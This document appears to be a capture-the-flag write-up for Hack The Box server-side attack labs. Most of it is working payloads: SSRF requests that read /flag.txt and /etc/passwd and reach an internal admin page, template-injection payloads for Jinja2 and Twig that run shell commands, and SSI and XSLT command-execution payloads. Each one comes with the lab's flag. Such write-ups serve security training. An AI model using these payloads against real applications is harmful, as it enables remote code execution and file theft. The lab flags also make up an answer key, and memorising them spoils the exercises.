

# Identifying SSRF

```json
POST /index.php HTTP/1.1
Host: 10.129.201.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.201.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.129.201.127
Connection: close
Priority: u=0

dateserver=file:///flag.txt&date=2024-01-01
```

answer: 

```json
HTTP/1.1 200 OK
Date: Sun, 01 Sep 2024 10:36:02 GMT
Server: Apache/2.4.59 (Debian)
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8

HTB{911fc5badf7d65aed95380d536c270f8}
```

# Exploiting SSRF

```json
POST /index.php HTTP/1.1
Host: 10.129.3.29
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.3.29/
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://10.129.3.29
Connection: close
Priority: u=0

dateserver=http://dateserver.htb/admin.php&date=2024-01-01
```

answer:

```json
HTTP/1.1 200 OK
Date: Sun, 01 Sep 2024 10:55:02 GMT
Server: Apache/2.4.59 (Debian)
Vary: Accept-Encoding
Content-Length: 361
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
</head>
<body>
    <div class="container">
        <h1>Admin Dashboard</h1>
        <h4>Hello Admin<h4>
        <p>HTB{61ea58507c2b9da30465b9582d6782a1}</p>    </div>
</body>
</html>
```

# Blind SSRF

answer : 5000


# Identifying SSTI

answer : Twig


# Exploiting SSTI - Jinja2

payload : {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}

answer: HTB{295649e25b4d852185ba34907ec80643}


# Exploiting SSTI - Twig

payload : {{ ['cat /flag.txt'] | filter('system') }}
answer : HTB{5034a6692604de344434ae83f1cdbec6}

# Exploiting SSI Injection

payload: <!--#exec cmd="cat /flag.txt" -->
answer: HTB{81e5d8e80eec8e961a31229e4a5e737e}

# Exploiting  XSLT Injection

payload: 
```xml
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

answer: HTB{3a4fe85c1f1e2b61cabe9836a150f892}

# Skills Assessment

di sini saya mengidentifikasi kerentanan dengan nama SSRF

```json
POST / HTTP/1.1
Host: 94.237.49.212:42718
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42718/
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://94.237.49.212:42718
Connection: close

api=file:///etc/passwd
```

payload
```json
POST / HTTP/1.1
Host: 94.237.49.212:42718
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.49.212:42718/
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://94.237.49.212:42718
Connection: close

api=file:///flag.txt
```

answer: HTB{3b8e2b940775e0267ce39d7c80488fc8}